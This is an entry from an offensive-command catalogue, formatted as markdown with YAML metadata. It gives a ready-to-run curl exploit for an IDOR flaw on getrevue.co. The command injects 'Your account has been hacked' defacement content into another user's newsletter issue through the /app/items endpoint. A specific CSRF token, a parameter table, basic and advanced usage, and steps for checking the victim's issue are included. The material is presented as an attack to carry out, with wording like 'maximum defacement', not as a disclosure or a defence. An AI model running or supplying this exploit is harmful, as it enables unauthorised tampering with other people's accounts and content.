---
id: c1d2e3f4-g5h6-7890-cdef-123456789012
data: >-
  curl -X POST https://www.getrevue.co/app/items -H "Content-Type:
  application/json" -H "X-CSRF-Token:
  qbWPNjfb12c1Plj7WrYDYgQFgWl2IaZr6/Qr/Vf5WyaDGyf68jn1mzx3xwtgFxBBX19RkHs/YHiREA7Ae6PGqg=="
  -H "Cookie: [YOUR_COOKIE]" -d
  '{"item_type":"image","issue":347976,"id":null,"title":"Your account has been
  hacked","url":"","description":"Your account has been hacked","author":"Your
  account has been hacked","publication":"Your account has been
  hacked","section":"Your account has been
  hacked","image":"https://revue-direct-production.s3.amazonaws.com/cache/30fd80f79ad919f1e310aa97e0ab7940/7dc308f18b70ba627eb954d2d5376bea.png","image_file_name":"","created_at":"","tweet_handle":"","tweet_profile_image":"","tweet_description":"","tweet_lang":""}'
tags:
  - idor
  - api
  - exploit
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:30:27.282Z'
verified: false
validated: true
submitted: true
---
# post-app-items-idor

## Command

```bash
curl -X POST https://www.getrevue.co/app/items \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: qbWPNjfb12c1Plj7WrYDYgQFgWl2IaZr6/Qr/Vf5WyaDGyf68jn1mzx3xwtgFxBBX19RkHs/YHiREA7Ae6PGqg==" \
  -H "Cookie: [YOUR_COOKIE]" \
  -d '{"item_type":"image","issue":347976,"id":null,"title":"Your account has been hacked","url":"","description":"Your account has been hacked","author":"Your account has been hacked","publication":"Your account has been hacked","section":"Your account has been hacked","image":"https://revue-direct-production.s3.amazonaws.com/cache/30fd80f79ad919f1e310aa97e0ab7940/7dc308f18b70ba627eb954d2d5376bea.png","image_file_name":"","created_at":"","tweet_handle":"","tweet_profile_image":"","tweet_description":"","tweet_lang":""}'
```

## Description

This curl command exploits an IDOR vulnerability by sending a POST request to the /app/items endpoint on getrevue.co, modifying a target issue (ID 347976) with arbitrary malicious content under an authenticated session. Use it after intercepting a legitimate request to replicate and alter the payload for unauthorized modifications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload format | Yes |
| `-H "X-CSRF-Token: ..."` | Anti-CSRF token from session | Yes |
| `-H "Cookie: [YOUR_COOKIE]"` | Authenticated session cookie | Yes |
| `-d '{...}'` | JSON payload with 'issue' ID and malicious fields | Yes |
| `issue` (in JSON) | Target issue ID to hijack | Yes |
| `title`, `description`, etc. (in JSON) | Arbitrary strings for defacement | Yes |
| `image` (in JSON) | URL of uploaded image from S3 | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.getrevue.co/app/items -H "Content-Type: application/json" -H "Cookie: [YOUR_COOKIE]" -d '{"item_type":"image","issue":347976,"title":"Hacked"}'
```

### Advanced Usage

Include full malicious payload as shown in the command section, with CSRF token and complete metadata for maximum defacement.

## Expected Output

A successful response (HTTP 200) with JSON like {"success": true, "item_id": "new_id"}, indicating the item was added to the target issue. Verify by checking the victim's issue for the new content.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-to-Modify-User-Issues-in-getrevue-co]]
